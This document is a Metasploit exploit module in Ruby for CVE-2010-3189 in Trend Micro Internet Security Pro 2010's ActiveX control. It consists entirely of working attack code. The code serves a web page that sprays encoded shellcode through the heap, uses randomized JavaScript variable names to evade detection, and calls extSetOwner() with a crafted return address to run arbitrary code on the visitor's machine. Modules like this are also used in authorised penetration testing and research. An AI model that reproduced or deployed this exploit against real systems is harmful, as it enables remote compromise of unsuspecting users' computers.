Trend Micro Internet Security Pro ActiveX extSetOwner() Code Execution
======================================================================

##
# trendmicro_extsetowner.rb
#
# Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution exploit for the Metasploit Framework
#
# Exploit successfully tested on the following platforms:
#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows XP SP3
#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows Vista SP2
#
# UfPBCtrl.dll version tested:
# File Version: 17.50.0.1366
# ClassID: 15DBC3F9-9F0A-472E-8061-043D9CEC52F0
# RegKey Safe for Script: True
# RegKey Safe for Init: True
# KillBitSet: False
#
# References:
#  - CVE-2010-3189
#  - OSVDB 67561
#  - http://www.zerodayinitiative.com/advisories/ZDI-10-165/ - Original advisory by Andrea Micalizzi aka rgod via Zero Day Initiative
#  - http://www.exploit-db.com/exploits/14878/ - MOAUB #03 exploit
#  - http://www.exploit-db.com/trend-micro-internet-security-pro-2010-activex-extsetowner-remote-code-execution/ - MOAUB #03 binary analysis
#  - http://www.rec-sec.com/2010/09/28/trend-micro-internet-security-2010-rce-exploit/ - Metasploit exploit by Trancer, Recognize-Security
#
# Trancer
# http://www.rec-sec.com
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote code execution vulnerability in Trend Micro
                    Internet Security Pro 2010 ActiveX.
                    When sending an invalid pointer to the extSetOwner() function of UfPBCtrl.dll
                    an attacker may be able to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Trancer <mtrancer[at]gmail.com&#039; ],
            &#039;Version&#039;        => &#039;$Revision:$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-3189&#039; ],
                    [ &#039;OSVDB&#039;, &#039;67561&#039;],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-165/&#039; ],   # Andrea Micalizzi aka rgod via Zero Day Initiative
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/14878/&#039; ],     # MOAUB #03
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;         => 1024,
                    &#039;BadChars&#039;      => "\x00",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7&#039;, { &#039;Ret&#039; => 0x00C750A1 } ]
                ],
            &#039;DisclosureDate&#039; => &#039;Aug 25 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def autofilter
        false
    end
 
    def check_dependencies
        use_zlib
    end
 
    def on_request_uri(cli, request)
        # Re-generate the payload.
        return if ((p = regenerate_payload(cli)) == nil)
 
        # Encode the shellcode.
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
         
        # Setup exploit buffers
        nops      = Rex::Text.to_unescape(make_nops(4))
        ret       = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))
        blocksize = 0x40000
        fillto    = 500
         
        # ActiveX parameters
        clsid   = "15DBC3F9-9F0A-472E-8061-043D9CEC52F0"
 
        # Randomize the javascript variable names
        ufpbctrl     = rand_text_alpha(rand(100) + 1)
        j_shellcode  = rand_text_alpha(rand(100) + 1)
        j_nops       = rand_text_alpha(rand(100) + 1)
        j_ret        = rand_text_alpha(rand(100) + 1)
        j_headersize = rand_text_alpha(rand(100) + 1)
        j_slackspace = rand_text_alpha(rand(100) + 1)
        j_fillblock  = rand_text_alpha(rand(100) + 1)
        j_block      = rand_text_alpha(rand(100) + 1)
        j_memory     = rand_text_alpha(rand(100) + 1)
        j_counter    = rand_text_alpha(rand(30) + 2)
 
        html = %Q|<html>
<object classid=&#039;clsid:#{clsid}&#039; id=&#039;#{ufpbctrl}&#039;></object>
<script>
var #{j_shellcode} = unescape(&#039;#{shellcode}&#039;);
var #{j_nops} = unescape(&#039;#{nops}&#039;);
var #{j_headersize} = 20;
var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
while (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});
var #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});
while (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
var #{j_memory} = new Array();
for (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) {
    #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};
}
#{ufpbctrl}.extSetOwner(unescape(&#039;#{ret}&#039;));
</script>
</html>|
 
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
 
        # Transmit the response to the client
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
 
        # Handle the payload
        handler(cli)
    end
end



